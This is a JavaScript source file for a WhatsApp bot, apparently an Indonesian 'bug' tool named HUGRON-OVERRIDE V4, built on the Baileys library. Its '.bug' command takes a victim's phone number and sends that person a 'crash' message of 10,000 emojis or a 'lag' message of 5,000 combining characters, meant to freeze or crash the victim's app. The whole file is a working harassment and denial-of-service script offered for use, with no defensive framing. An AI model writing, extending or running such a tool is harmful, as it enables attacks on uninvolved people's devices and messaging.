const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys")
const pino = require('pino')
const qrcode = require('qrcode-terminal')

async function startBot() {
    const { state, saveCreds } = await useMultiFileAuthState('auth_info')
    const client = makeWASocket({
        logger: pino({ level: 'silent' }),
        auth: state,
        printQRInTerminal: true
    })

    console.log("⚡ HUGRON-OVERRIDE V4: ONLINE ⚡")

    client.ev.on('messages.upsert', async m => {
        const msg = m.messages[0]
        if (!msg.message || msg.key.fromMe) return
        const from = msg.key.remoteJid
        const body = msg.message.conversation || msg.message.extendedTextMessage?.text || ""

        if (body.startsWith('.bug')) {
            const args = body.split(" ")
            const target = args[1] + "@s.whatsapp.net"
            const method = args[2]

            if (!method) return client.sendMessage(from, { text: "Format: .bug [nomor] [metode]" })

            client.sendMessage(from, { text: `🚀 Menyerang ${args[1]}...` })

            if (method === 'crash') {
                await client.sendMessage(target, { text: "🔥".repeat(10000) }) 
            } else if (method === 'lag') {
                await client.sendMessage(target, { text: "ॣ".repeat(5000) })
            }
        }
    })

    client.ev.on('creds.update', saveCreds)
}

startBot()
          
